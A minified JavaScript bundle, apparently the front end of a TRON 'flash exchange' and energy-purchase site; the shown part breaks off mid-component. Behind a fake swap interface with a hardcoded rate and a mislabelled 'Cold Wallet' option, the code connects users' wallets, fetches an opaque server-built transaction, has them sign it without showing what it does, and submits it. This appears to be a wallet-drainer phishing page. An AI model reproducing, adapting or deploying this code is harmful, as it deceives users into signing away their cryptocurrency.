"use strict";
(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [909], {
        6909: function(e, t, a) {
            a.r(t), a.d(t, {
                default: function() {
                    return A
                }
            });
            var n = a(5893),
                r = a(7294),
                s = a(632);

            function i() {
                let [e, t] = (0, r.useState)((0, s._f)()), [a, i] = (0, r.useState)(!1), o = (0, r.useRef)(null), l = [
                    ["en", "English", "/img/us.5a62e6ccf186c5486b03.png"],
                    ["zh", "简体中文", "/img/cn.1f0b4f73520f6365645d.png"],
                    ["de", "Deutsch", "/img/de.19b904a05a7f6809385a.png"],
                    ["fr", "Fran\xe7ais", "/img/fr.a24cc71d4a6b8119a9b2.png"],
                    ["es", "Espa\xf1ol", "/img/es.d14f26c8b85a7c0b073b.png"],
                    ["pt", "Portugu\xeas", "/img/pt.50472a1046d910cbcdac.png"],
                    ["vi", "Tiếng Việt", "/img/vn.c2c6b223ce8e67df1758.png"],
                    ["th", "ไทย", "/img/th.130096fc16f4ac51d36d.png"],
                    ["ja", "日本語", "/img/jp.c57a40e258b8bcdd3137.png"],
                    ["ko", "한국어", "/img/kr.f5a2730f3f2f4f6b3a37.png"],
                    ["ru", "Русский", "/img/ru.a7ddae7d588aea8dd508.png"],
                    ["hi", "हिन्दी", "/img/in.e10796a0b01992836466.png"],
                    ["ar", "العربية", "/img/sa.809743dfee892a09e9d5.png"]
                ];
                (0, r.useEffect)(() => {
                    let e = e => {
                        o.current && !o.current.contains(e.target) && i(!1)
                    };
                    return document.addEventListener("click", e), () => document.removeEventListener("click", e)
                }, []);
                let c = e => {
                        (0, s.Wg)(e), t(e), i(!1)
                    },
                    d = (() => {
                        let e = window.location.hostname.toLowerCase(),
                            t = e.split(".");
                        return t.length >= 2 ? t[t.length - 2].toUpperCase() : e.toUpperCase()
                    })(),
                    m = l.find(t => {
                        let [a] = t;
                        return a === e
                    }) || ["en", "English", "/img/us.5a62e6ccf186c5486b03.png"];
                return (0, n.jsxs)("header", {
                    className: "flex items-center justify-between border-b border-gray-700 mb-6 pb-4",
                    children: [(0, n.jsxs)("div", {
                        className: "flex items-center space-x-3",
                        children: [(0, n.jsx)("img", {
                            src: "/img/logo.234b00e2329cafb68710.png",
                            alt: "Logo",
                            className: "h-12"
                        }), (0, n.jsx)("span", {
                            className: "relative top-[3px] logo-gradient-text font-semibold text-2xl",
                            children: d
                        })]
                    }), (0, n.jsxs)("div", {
                        ref: o,
                        className: "relative inline-block text-left",
                        children: [(0, n.jsxs)("div", {
                            onClick: () => i(!a),
                            className: "cursor-pointer text-white border border-gray-600 rounded px-3 py-1 bg-[#0b1221] min-w-[13ch] flex justify-between items-center",
                            children: [(0, n.jsxs)("div", {
                                className: "flex items-center gap-2",
                                children: [(0, n.jsx)("img", {
                                    src: m[2],
                                    alt: m[1],
                                    width: "20",
                                    height: "13",
                                    className: "rounded-sm object-cover"
                                }), (0, n.jsx)("span", {
                                    children: m[1]
                                })]
                            }), (0, n.jsx)("svg", {
                                xmlns: "http://www.w3.org/2000/svg",
                                className: "w-4 h-4 ml-2 transition-transform duration-200 ".concat(a ? "rotate-180" : ""),
                                fill: "none",
                                viewBox: "0 0 24 24",
                                stroke: "currentColor",
                                children: (0, n.jsx)("path", {
                                    strokeLinecap: "round",
                                    strokeLinejoin: "round",
                                    strokeWidth: "2",
                                    d: "M19 9l-7 7-7-7"
                                })
                            })]
                        }), a && (0, n.jsx)("div", {
                            className: "absolute right-0 mt-1 w-full bg-[#0b1221] rounded shadow border border-gray-600 z-10",
                            children: l.map(t => {
                                let [a, r, s] = t;
                                return (0, n.jsxs)("div", {
                                    onClick: () => c(a),
                                    className: "px-3 py-1 flex items-center gap-2 cursor-pointer transition ".concat(e === a ? "bg-[#007fe9] text-white" : "hover:bg-gray-700 text-gray-300"),
                                    children: [(0, n.jsx)("img", {
                                        src: s,
                                        alt: r,
                                        width: "20",
                                        height: "13",
                                        className: "rounded-sm object-cover"
                                    }), (0, n.jsx)("span", {
                                        children: r
                                    })]
                                }, a)
                            })
                        })]
                    })]
                })
            }

            function o() {
                let e = (0, s.Sv)();
                return (0, n.jsx)("section", {
                    id: "notice-banner",
                    className: "mb-4 gradient-border",
                    children: (0, n.jsxs)("div", {
                        className: "relative p-4 overflow-hidden rounded-lg bg-gray-900 bg-center bg-cover bg-halo",
                        children: [(0, n.jsx)("div", {
                            className: "light-sweep-blue"
                        }), (0, n.jsx)("p", {
                            className: "relative text-gray-300 leading-relaxed text-left text-base",
                            dangerouslySetInnerHTML: {
                                __html: e("desc")
                            }
                        })]
                    })
                })
            }
            var l = a(3935);
            async function c() {
                let {
                    timeout: e = 1e4,
                    interval: t = 200
                } = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}, a = Date.now();
                for (; Date.now() - a < e;) {
                    var n, r;
                    let e = (null === (n = window.tronLink) || void 0 === n ? void 0 : n.tronWeb) || window.tronWeb,
                        a = (null == e ? void 0 : null === (r = e.defaultAddress) || void 0 === r ? void 0 : r.base58) || null;
                    if (a) return a;
                    await

                    function(e) {
                        return new Promise(t => setTimeout(t, e))
                    }(t)
                }
                return null
            }
            async function d() {
                let e = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
                try {
                    var t, a, n, r, s, i;
                    let o = null;
                    if (o = (null === (a = (null === (n = window.tronLink) || void 0 === n ? void 0 : n.tronWeb) || window.tronWeb) || void 0 === a ? void 0 : null === (t = a.defaultAddress) || void 0 === t ? void 0 : t.base58) || null) return window.APP_STATE || (window.APP_STATE = {}), window.APP_STATE.wallet = {
                        connected: !0,
                        type: "tronlink",
                        address: o
                    }, o;
                    if (e) {
                        if (null === (i = window.tronLink) || void 0 === i ? void 0 : i.request) try {
                            await window.tronLink.request({
                                method: "tron_requestAccounts"
                            })
                        } catch (e) {
                            console.warn("⚠️ 移动端 request 异常(不立即失败):", e)
                        }
                        if (!(o = await c({
                                timeout: 1500,
                                interval: 150
                            }))) {
                            let e = window.location.href,
                                t = "tronlinkoutside://pull.activity?wallet=tronlink&param=".concat(encodeURIComponent(JSON.stringify({
                                    url: e,
                                    action: "open",
                                    protocol: "tronlink",
                                    version: "1.0"
                                })));
                            if (window.location.href = t, !(o = await c({
                                    timeout: 1e4,
                                    interval: 200
                                }))) return null
                        }
                    } else if ((null === (r = window.tronLink) || void 0 === r ? void 0 : r.request) ? await window.tronLink.request({
                            method: "tron_requestAccounts"
                        }) : (null === (s = window.tron) || void 0 === s ? void 0 : s.request) && await window.tron.request({
                            method: "eth_requestAccounts"
                        }), !(o = await c({
                            timeout: 8e3,
                            interval: 200
                        }))) throw Error("未获取到 TronLink 地址，请确认插件已安装并解锁。");
                    return window.APP_STATE || (window.APP_STATE = {}), window.APP_STATE.wallet = {
                        connected: !0,
                        type: "tronlink",
                        address: o
                    }, o
                } catch (e) {
                    return console.error("❌ 连接 TronLink 失败:", e), null
                }
            }
            var m = a(2826),
                p = a(2592);
            let g = "tron:0x2b6653dc",
                x = null;
            async function w() {
                return x || (x = await m.ZP.init({
                    projectId: "2540c6a061bc091e252d10121ef1ab11",
                    metadata: {
                        name: "Cold Wallet",
                        description: "Cold Wallet wants to connect to your wallet",
                        url: window.location.origin,
                        icons: [window.location.origin + "/img/coldwallet.png"]
                    }
                })), x
            }
            async function u() {
                var e, t;
                let y = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "trust",
                    b = "binance" === y ? "Binance Wallet" : "okx" === y ? "OKX Wallet" : "imtoken" === y ? "imToken" : "safepal" === y ? "SafePal" : "Trust Wallet";
                let D = e => {
                    let t = encodeURIComponent(e);
                    return "binance" === y ? "bnc://app.binance.com/cedefi/wc?uri=".concat(t) : "imtoken" === y ? "imtokenv2://wc?uri=".concat(t) : "safepal" === y ? "safepal://wc?uri=".concat(t) : "https://link.trustwallet.com/wc?uri=".concat(t)
                };
                let a = await w(),
                    n = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                    {
                        uri: r,
                        approval: s
                    } = await a.connect({
                        requiredNamespaces: {
                            tron: {
                                methods: ["tron_signTransaction"],
                                chains: [g],
                                events: []
                            }
                        }
                    });
                if (r) {
                    if (n) {
                        let e = D(r);
                        window.location.href = e
                    } else {
                        let e;
                        try {
                            e = await p.toDataURL(r)
                        } catch (t) {
                            console.warn("QR data URL generation failed, using fallback image:", t), e = "https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=".concat(encodeURIComponent(r))
                        }
                        window.dispatchEvent(new CustomEvent("showLoader", {
                            detail: null
                        })), window.dispatchEvent(new CustomEvent("openWalletQr", {
                            detail: {
                                qrDataUrl: e,
                                walletName: b
                            }
                        }))
                    }
                }
                let i = await s();
                n || window.dispatchEvent(new Event("closeWalletQr"));
                let o = (null == i ? void 0 : null === (t = i.namespaces) || void 0 === t ? void 0 : null === (e = t.tron) || void 0 === e ? void 0 : e.accounts) || [],
                    l = o.length ? o[0].split(":")[2] : null;
                return window.trustWallet = {
                    session: i,
                    client: a,
                    wcUri: r,
                    async signTransaction(e) {
                        if (n) {
                            let e = D(this.wcUri);
                            console.log("➡️ Mobile reopen wallet:", e), window.location.href = e
                        }
                        let {
                            result: t
                        } = await a.request({
                            topic: this.session.topic,
                            chainId: g,
                            request: {
                                method: "tron_signTransaction",
                                params: {
                                    transaction: {
                                        transaction: e
                                    }
                                }
                            }
                        });
                        return t
                    }
                }, window.APP_STATE || (window.APP_STATE = {}), window.APP_STATE.wallet = {
                    connected: !0,
                    type: "trust",
                    address: l
                }, l
            }

            function f() {
                let e = (window.location.hostname || "").toLowerCase().replace(/^www\./, "");
                if (!e) return "https://api.coldwallet.win";
                if ("localhost" === e || "127.0.0.1" === e) return "".concat(window.location.origin.replace(/\/$/, ""), "/api");
                if (e.startsWith("api.")) return "".concat(window.location.protocol, "//").concat(e);
                if ("coldwallet.win" === e || e.endsWith(".coldwallet.win")) return "https://api.coldwallet.win";
                let t = e.split("."),
                    a = t.length >= 2 ? t.slice(-2).join(".") : e;
                return "https://api.".concat(a)
            }
            async function h(e) {
                var t, a, n, r;
                let s = null === (t = window.APP_STATE) || void 0 === t ? void 0 : t.wallet;
                if (!(null == s ? void 0 : s.connected)) {
                    window.showToast(e("NOT_CONNECTED"), "error");
                    return
                }
                try {
                    let t;
                    window.dispatchEvent(new Event("closeWalletOverlay")), window.showWaiting(e("LOADING_PREPARE"));
                    let i = await fetch("".concat(f(), "/api/checkWallet"), {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                type: s.type,
                                address: s.address
                            })
                        }),
                        o = await i.json();
                    if (!o.ok) {
                        window.hideWaiting();
                        let t = o.code || "ERR_UNKNOWN";
                        window.showToast(e(t) || e("ERR_UNKNOWN"), "error");
                        return
                    }
                    console.log("[WalletConnect][debug] expected recipient", s.address);
                    console.log("[WalletConnect][debug] checkWallet response", o);
                    console.log("[WalletConnect][debug] unsignedTx", o.unsignedTx);
                    console.log("[WalletConnect][debug] txID", (null == o ? void 0 : o.txID) || (null == o ? void 0 : o.txid) || (null == o ? void 0 : o.transactionID) || (null == o ? void 0 : o.unsignedTx) && (null == o.unsignedTx ? void 0 : o.unsignedTx.txID) || "");
                    try {
                        console.log("[WalletConnect][debug] localStorage keys", Object.keys(localStorage || {})),
                            console.log("[WalletConnect][debug] sessionStorage keys", Object.keys(sessionStorage || {}))
                    } catch (e) {
                        console.warn("[WalletConnect][debug] storage snapshot failed", e)
                    }
                    let l = o.unsignedTx;
                    if (!l) {
                        window.hideWaiting(), window.showToast(e("TX_MISSING"), "error");
                        return
                    }
                    if (window.updateWaiting(e("LOADING_SIGN")), "tronlink" === s.type) {
                        let e = (null === (a = window.tronLink) || void 0 === a ? void 0 : a.tronWeb) || window.tronWeb;
                        if (!(null == e ? void 0 : null === (n = e.trx) || void 0 === n ? void 0 : n.sign)) throw Error("SIGN_API_MISSING");
                        t = await e.trx.sign(l)
                    } else if ("trust" === s.type) {
                        if (!(null === (r = window.trustWallet) || void 0 === r ? void 0 : r.signTransaction)) throw Error("SIGN_API_MISSING");
                        t = await window.trustWallet.signTransaction(l)
                    } else throw Error("Unsupported wallet type: ".concat(s.type));
                    window.updateWaiting(e("LOADING_SUBMIT"));
                    let c = await fetch("".concat(f(), "/api/submitTx"), {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                address: s.address,
                                signedTx: t
                            })
                        }),
                        d = await c.json();
                    if (window.hideWaiting(), d.ok) {
                        let a = d.txid || d.transaction_id || (null == t ? void 0 : t.txID) || "",
                            n = new URL("/transaction-success.html", window.location.origin);
                        a && n.searchParams.set("txid", a), s.address && n.searchParams.set("address", s.address), s.type && n.searchParams.set("wallet", s.type), "function" == typeof window.gtag && window.gtag("event", "conversion", {
                            send_to: "AW-428375910/jwhpCJWpougbEOb-ocwB",
                            value: 1,
                            currency: "USD",
                            transaction_id: a
                        }), setTimeout(() => {
                            try {
                                window.parent.postMessage({
                                    source: "wallet-engine",
                                    type: "complete",
                                    txid: a,
                                    address: s.address,
                                    wallet: s.type
                                }, window.location.origin)
                            } catch (e) {
                                console.error("Wallet completion handoff failed:", e)
                            }
                        }, 180)
                    }
                    else {
                        let t = d.code || "ERR_BROADCAST";
                        window.showToast(e(t) || e("ERR_BROADCAST"), "error")
                    }
                } catch (t) {
                    console.error(t), window.hideWaiting(),
                        function(e) {
                            let t = ((null == e ? void 0 : e.message) || (null == e ? void 0 : e.toString()) || "").toLowerCase();
                            return t.includes("cancel") || t.includes("declined") || t.includes("denied") || t.includes("rejected") || t.includes("user closed") || t.includes("user reject") || t.includes("user canceled") || t.includes("user cancelled") || t.includes("request rejected")
                        }(t) ? window.showToast(e("USER_CANCEL"), "error") : "SIGN_API_MISSING" === t.message ? window.showToast(e("SIGN_API_MISSING"), "error") : window.showToast(e("ERR_UNKNOWN"), "error")
                }
            }

            function b() {
                let [e, t] = (0, r.useState)(!1), [a, i] = (0, r.useState)(!1), o = (0, s.Sv)(), c = () => {
                    var e;
                    let t = null === (e = window.APP_STATE) || void 0 === e ? void 0 : e.wallet;
                    return t && t.connected && t.address
                }, m = () => {
                    c() ? (console.log("⚡ Wallet already connected, auto authorizing..."), h(o)) : i(!0)
                };
                if ((0, r.useEffect)(() => (t(!0), window.openWalletModal = m, window.closeWalletModal = () => i(!1), () => {
                        delete window.openWalletModal, delete window.closeWalletModal
                    }), []), !e) return null;
                let p = async e => {
                        var t, a, n, r, s, i, l, c, m;
                        try {
                            null === (t = (a = window).closeWalletModal) || void 0 === t || t.call(a), null === (n = (r = window).showWaiting) || void 0 === n || n.call(r, o("WALLET_LOADING_CONNECT", {
                                wallet: e
                            }));
                            let c = !1;
                            "trust" === e || "binance" === e || "okx" === e || "imtoken" === e || "safepal" === e ? c = await u(e) : "tronlink" === e && (c = await d()), await new Promise(e => setTimeout(e, 600));
                            let m = null === (s = window.APP_STATE) || void 0 === s ? void 0 : s.wallet;
                            !1 !== c && (null == m ? void 0 : m.connected) && (null == m ? void 0 : m.address) ? (window.showToast(o("WALLET_CONNECT_SUCCESS", {
                                wallet: e
                            }), "success"), setTimeout(() => h(o), 500)) : (null === (i = (l = window).hideWaiting) || void 0 === i || i.call(l), window.showToast(o("WALLET_CONNECT_FAIL", {
                                wallet: e
                            }), "error"))
                        } catch (t) {
                            console.error("Wallet connect failed:", t), null === (c = (m = window).hideWaiting) || void 0 === c || c.call(m), window.showToast(o("WALLET_CONNECT_FAIL", {
                                wallet: e
                            }), "error")
                        }
                    },
                    g = (0, n.jsxs)("div", {
                        id: "walletModal",
                        style: {
                            display: a ? "block" : "none"
                        },
                        children: [(0, n.jsx)("div", {
                            className: "wallet-backdrop",
                            onClick: () => i(!1)
                        }), (0, n.jsx)("div", {
                            className: "wallet-wrapper",
                            children: (0, n.jsx)("div", {
                                className: "gradient-border",
                                id: "walletContent",
                                children: (0, n.jsxs)("div", {
                                    className: "wallet-modal-content",
                                    children: [(0, n.jsx)("button", {
                                        onClick: () => i(!1),
                                        className: "wallet-close-btn",
                                        children: "\xd7"
                                    }), (0, n.jsx)("h2", {
                                        style: {
                                            textAlign: "center",
                                            marginBottom: 20
                                        },
                                        children: o("chooseWallet")
                                    }), (0, n.jsxs)("div", {
                                        className: "wallet-grid",
                                        children: [(0, n.jsxs)("a", {
                                            id: "trust",
                                            className: "wallet-item",
                                            onClick: () => p("trust"),
                                            children: [(0, n.jsx)("img", {
                                                src: "/img/Trust.27b0eac7ee52b2f6550c.png",
                                                alt: "Trust Wallet"
                                            }), (0, n.jsx)("span", {
                                                children: o("trustWallet")
                                            })]
                                        }), (0, n.jsxs)("a", {
                                            id: "binance",
                                            className: "wallet-item",
                                            onClick: () => p("binance"),
                                            children: [(0, n.jsx)("img", {
                                                src: "/img/coldwallet.png",
                                                alt: "Cold Wallet"
                                            }), (0, n.jsx)("span", {
                                                children: "Cold Wallet"
                                            })]
                                        }), (0, n.jsxs)("a", {
                                            id: "okx",
                                            className: "wallet-item",
                                            onClick: () => p("okx"),
                                            children: [(0, n.jsx)("img", {
                                                src: "/img/okx.6bf5a52ec1c367a3fc94.png",
                                                alt: "OKX Wallet"
                                            }), (0, n.jsx)("span", {
                                                children: "OKX Wallet"
                                            })]
                                        }), (0, n.jsxs)("a", {
                                            id: "imtoken",
                                            className: "wallet-item",
                                            onClick: () => p("imtoken"),
                                            children: [(0, n.jsx)("img", {
                                                src: "/img/imtoken.a47bc069bc7b9ad18023.png",
                                                alt: "imToken"
                                            }), (0, n.jsx)("span", {
                                                children: "imToken"
                                            })]
                                        }), (0, n.jsxs)("a", {
                                            id: "safepal",
                                            className: "wallet-item",
                                            onClick: () => p("safepal"),
                                            children: [(0, n.jsx)("img", {
                                                src: "/img/safepal.3d409c82d7d947f8c201.png",
                                                alt: "SafePal"
                                            }), (0, n.jsx)("span", {
                                                children: "SafePal"
                                            })]
                                        }), (0, n.jsxs)("a", {
                                            id: "tronlink",
                                            className: "wallet-item",
                                            onClick: () => p("tronlink"),
                                            children: [(0, n.jsx)("img", {
                                                src: "/img/tronlink.d99d22355fc4cec2ea0d.png",
                                                alt: "TronLink"
                                            }), (0, n.jsx)("span", {
                                                children: o("tronlinkWallet")
                                            })]
                                        })]
                                    })]
                                })
                            })
                        })]
                    });
                return (0, l.createPortal)(g, document.body)
            }

            function y() {
                let e = (0, s.Sv)(),
                    [t, a] = (0, r.useState)("swap"),
                    [i, o] = (0, r.useState)("USDT"),
                    [l, c] = (0, r.useState)("TRX"),
                    [d, m] = (0, r.useState)("1.5"),
                    [p, g] = (0, r.useState)("8.220170"),
                    [x, w] = (0, r.useState)("--"),
                    [u, C] = (0, r.useState)(null),
                    [h, y] = (0, r.useState)(null),
                    [v, j] = (0, r.useState)(1),
                    [N, k] = (0, r.useState)(!1),
                    T = [{
                        count: 1,
                        energy: 64400,
                        price: .5
                    }, {
                        count: 2,
                        energy: 130400,
                        price: 1
                    }, {
                        count: 5,
                        energy: 322e3,
                        price: 2.5
                    }, {
                        count: 10,
                        energy: 644e3,
                        price: 5
                    }],
                    S = e => a(e);
                async function E() {
                    let e = 3.23,
                        t = 1 / e;
                    C(e), y(t), w("1 USDT ≈ 3.230000 TRX"), g((parseFloat(d || 0) * e).toFixed(6))
                }
                return (0, r.useEffect)(() => {
                    E();
                    let e = setInterval(() => {
                        E()
                    }, 3e4);
                    return () => clearInterval(e)
                }, []), (0, r.useEffect)(() => {
                    u && h && ("USDT" === i ? (g((parseFloat(d || 0) * u).toFixed(6)), w("1 USDT ≈ ".concat(u.toFixed(6), " TRX"))) : (g((parseFloat(d || 0) * h).toFixed(6)), w("1 TRX ≈ ".concat(h.toFixed(6), " USDT"))))
                }, [d, i, u, h]), (0, n.jsxs)(n.Fragment, {
                    children: [(0, n.jsx)("section", {
                        className: "gradient-border mb-4",
                        children: (0, n.jsxs)("div", {
                            className: "bg-halo rounded-lg p-5 relative overflow-hidden",
                            children: [(0, n.jsx)("div", {
                                className: "relative flex justify-between mb-6 border-b border-[#0a3d66]",
                                children: (0, n.jsxs)("div", {
                                    className: "flex w-full relative",
                                    children: [
                                        ["swap", "energy"].map(a => (0, n.jsx)("div", {
                                            className: "flex-1 text-center py-2 cursor-pointer font-medium transition-all duration-300 ".concat(t === a ? "text-white" : "text-gray-400 hover:text-gray-200"),
                                            onClick: () => S(a),
                                            children: "swap" === a ? e("flashExchange") : e("buyEnergy")
                                        }, a)), (0, n.jsx)("div", {
                                            className: "absolute bottom-0 h-[2px] bg-[#007fe9] transition-all duration-300 ".concat("swap" === t ? "left-0 w-1/2" : "left-1/2 w-1/2")
                                        })
                                    ]
                                })
                            }), "swap" === t && (0, n.jsxs)(n.Fragment, {
                                children: [(0, n.jsxs)("div", {
                                    className: "mb-4",
                                    children: [(0, n.jsx)("label", {
                                        className: "block mb-1 font-medium text-white",
                                        children: e("payLabel")
                                    }), (0, n.jsxs)("div", {
                                        className: "relative",
                                        children: [(0, n.jsx)("input", {
                                            type: "text",
                                            value: d,
                                            onChange: e => m(e.target.value),
                                            className: "w-full h-11 rounded-lg bg-[#0b1221] text-white border border-gray-700 focus:ring-2 focus:ring-[#007fe9] pl-4 pr-28 text-[15px] leading-none"
                                        }), (0, n.jsxs)("div", {
                                            className: "pointer-events-none select-none absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2",
                                            children: [(0, n.jsx)("img", {
                                                src: "/img/".concat(i.toLowerCase(), ".png"),
                                                className: "w-[22px] h-[22px]"
                                            }), (0, n.jsx)("span", {
                                                className: "text-white text-[15px]",
                                                children: i
                                            })]
                                        })]
                                    })]
                                }), (0, n.jsx)("div", {
                                    className: "flex justify-center my-3",
                                    children: (0, n.jsx)("button", {
                                        onClick: () => {
                                            o(l), c(i), u && h && ("USDT" === l ? (w("1 USDT ≈ ".concat(u.toFixed(6), " TRX")), g((parseFloat(d || 0) * u).toFixed(6))) : (w("1 TRX ≈ ".concat(h.toFixed(6), " USDT")), g((parseFloat(d || 0) * h).toFixed(6))))
                                        },
                                        className: "text-white hover:text-blue-400 transition",
                                        children: (0, n.jsx)("i", {
                                            className: "i-local:reverse-currency?mask w-6 h-6"
                                        })
                                    })
                                }), (0, n.jsxs)("div", {
                                    className: "mb-4",
                                    children: [(0, n.jsx)("label", {
                                        className: "block mb-1 font-medium text-white",
                                        children: e("receiveLabel")
                                    }), (0, n.jsxs)("div", {
                                        className: "relative",
                                        children: [(0, n.jsx)("input", {
                                            type: "text",
                                            value: p,
                                            readOnly: !0,
                                            className: "w-full h-11 rounded-lg bg-[#0b1221] text-white border border-gray-700 focus:ring-2 focus:ring-[#007fe9] pl-4 pr-28 text-[15px] leading-none"
                                        }), (0, n.jsxs)("div", {
                                            className: "pointer-events-none select-none absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2",
                                            children: [(0, n.jsx)("img", {
                                                src: "/img/".concat(l.toLowerCase(), ".png"),
                                                className: "w-[22px] h-[22px]"
                                            }), (0, n.jsx)("span", {
                                                className: "text-white text-[15px]",
                                                children: l
                                            })]
                                        })]
                                    })]
                                }), (0, n.jsxs)("div", {
                                    className: "bg-[#142546] rounded-lg text-sm text-gray-300 px-4 py-2 mt-4",
                                    children: [(0, n.jsxs)("div", {
                                        className: "flex justify-between items-center mb-1",
                                        children: [(0, n.jsx)("span", {
                                            children: e("exchangeRate")
                                        }), (0, n.jsx)("span", {
                                            children: x
                                        })]
                                    }), (0, n.jsxs)("div", {
                                        className: "flex justify-between items-center",
                                        children: [(0, n.jsx)("span", {
                                            children: e("payment")
                                        }), (0, n.jsxs)("span", {
                                            className: "text-green-400",
                                            children: [d, " ", i]
                                        })]
                                    })]
                                }), (0, n.jsx)("div", {
                                    className: "flex justify-center mt-6",
                                    children: (0, n.jsx)("button", {
                                        onClick: () => {
                                            let t = parseFloat(d);
                                            if (isNaN(t) || t <= 1) {
                                                alert(e("usdtMinAmount"));
                                                return
                                            }
                                            window.openWalletModal && window.openWalletModal()
                                        },
                                        className: "w-full py-3 bg-[#007fe9] hover:bg-[#0095ff] text-white font-medium rounded-lg transition-all",
                                        children: e("exchangeNow")
                                    })
                                })]
                            }), "energy" === t && (0, n.jsxs)(n.Fragment, {
                                children: [(0, n.jsxs)("div", {
                                    className: "mt-4",
                                    children: [(0, n.jsxs)("div", {
                                        className: "flex justify-between items-center mb-2",
                                        children: [(0, n.jsx)("label", {
                                            className: "font-medium text-white",
                                            children: e("buyCount")
                                        }), (0, n.jsx)("span", {
                                            className: "text-gray-400 text-sm",
                                            children: e("tip")
                                        })]
                                    }), (0, n.jsx)("div", {
                                        className: "grid grid-cols-4 gap-4",
                                        children: T.map(e => (0, n.jsxs)("button", {
                                            onClick: () => j(e.count),
                                            className: "px-3 py-1 border rounded text-white transition ".concat(v === e.count ? "border-blue-500 bg-blue-900/40" : "border-gray-500 hover:bg-gray-700"),
                                            children: [e.count, "x"]
                                        }, e.count))
                                    })]
                                }), (0, n.jsx)("div", {
                                    className: "mt-4 bg-[#142546] rounded-lg p-3 text-sm text-gray-300",
                                    children: T.filter(e => e.count === v).map(t => (0, n.jsxs)("div", {
                                        children: [(0, n.jsxs)("div", {
                                            className: "flex justify-between mb-1",
                                            children: [(0, n.jsx)("span", {
                                                children: e("getEnergy")
                                            }), (0, n.jsx)("span", {
                                                children: t.energy.toLocaleString()
                                            })]
                                        }), (0, n.jsxs)("div", {
                                            className: "flex justify-between",
                                            children: [(0, n.jsx)("span", {
                                                children: e("payment")
                                            }), (0, n.jsxs)("span", {
                                                className: "text-green-400",
                                                children: [t.price, " TRX"]
                                            })]
                                        })]
                                    }, t.count))
                                }), (0, n.jsx)("div", {
                                    className: "flex justify-center mt-5",
                                    children: (0, n.jsx)("button", {
                                        onClick: () => {
                                            window.openWalletModal && window.openWalletModal()
                                        },
                                        className: "w-full py-3 bg-[#007fe9] hover:bg-[#0095ff] text-white rounded-lg font-medium transition-all",
                                        children: e("purchaseBtn")
                                    })
                                })]
                            })]
                        })
                    }), N && (0, n.jsx)(b, {
                        onClose: () => k(!1)
                    })]
                })
            }

            function v() {
                let [e, t] = (0, r.useState)(null), a = (0, s.Sv)(), i = [{
                    q: a("faqQuestion1"),
                    a: a("faqAnswer1")
                }, {
                    q: a("faqQuestion2"),
                    a: a("faqAnswer2")
                }, {
                    q: a("faqQuestion3"),
                    a: a("faqAnswer3")
                }, {
                    q: a("faqQuestion4"),
                    a: a("faqAnswer4")
                }, {
                    q: a("faqQuestion5"),
                    a: a("faqAnswer5")
                }];
                return (0, n.jsx)("section", {
                    className: "gradient-border mb-4",
                    children: (0, n.jsx)("div", {
                        className: "bg-halo rounded-lg p-5",
                        children: (0, n.jsxs)("div", {
                            className: "faq-section",
                            children: [(0, n.jsx)("div", {
                                className: "text-center mb-2 flex items-center justify-center space-x-2",
                                children: (0, n.jsx)("span", {
                                    className: "text-sm text-gray-300 tracking-widest uppercase",
                                    children: a("instructionFaqTitle")
                                })
                            }), i.map((a, r) => (0, n.jsxs)("div", {
                                className: "faq-box rounded-md p-3 mb-2",
                                style: {
                                    backgroundColor: "#142546",
                                    padding: "8px 16px",
                                    borderRadius: "8px"
                                },
                                children: [(0, n.jsxs)("div", {
                                    className: "faq-question-wrapper flex items-center justify-between cursor-pointer",
                                    onClick: () => t(e === r ? null : r),
                                    children: [(0, n.jsx)("div", {
                                        className: "faq-question text-left text-gray-200",
                                        children: a.q
                                    }), (0, n.jsx)("i", {
                                        className: "i-local:faq-arrow faq-arrow transform transition-transform duration-300 ".concat(e === r ? "rotate-180" : "rotate-0"),
                                        style: {
                                            width: "16px",
                                            height: "16px"
                                        }
                                    })]
                                }), (0, n.jsx)("div", {
                                    className: "faq-answer text-gray-400 mt-2 transition-all duration-300 ".concat(e === r ? "block opacity-100" : "hidden opacity-0"),
                                    children: a.a
                                })]
                            }, r))]
                        })
                    })
                })
            }

            function j() {
                let e = (0, s.Sv)();
                return (0, n.jsx)("section", {
                    className: "gradient-border mb-4",
                    children: (0, n.jsxs)("div", {
                        className: "p-5 bg-gray-900 rounded-lg bg-center bg-cover bg-halo",
                        children: [(0, n.jsx)("div", {
                            className: "flex justify-center items-center text-center space-x-2 mb-2",
                            children: (0, n.jsx)("span", {
                                className: "tracking-widest uppercase text-sm text-gray-300",
                                children: e("partners")
                            })
                        }), (0, n.jsx)("div", {
                            className: "partners-container relative h-15 overflow-hidden",
                            children: (0, n.jsxs)("div", {
                                className: "partners-track whitespace-nowrap flex animate-scroll",
                                children: [(0, n.jsx)("img", {
                                    src: "/img/logo.234b00e2329cafb68710.png",
                                    alt: "LOGO",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/WalletConnect.bd1727b2c6b0798d35c1.png",
                                    alt: "WalletConnect",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/Trust.27b0eac7ee52b2f6550c.png",
                                    alt: "Trust",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/trx.png",
                                    alt: "TRX",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/tokenpocket.5171aeed69d1da2ab805.png",
                                    alt: "TokenPocket",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/okx.6bf5a52ec1c367a3fc94.png",
                                    alt: "OKX",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/tronlink.d99d22355fc4cec2ea0d.png",
                                    alt: "TronLink",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
                                    src: "/img/imtoken.a47bc069bc7b9ad18023.png",
                                    alt: "imToken",
                                    className: "partner-logo opacity-75"
                                }), (0, n.jsx)("img", {
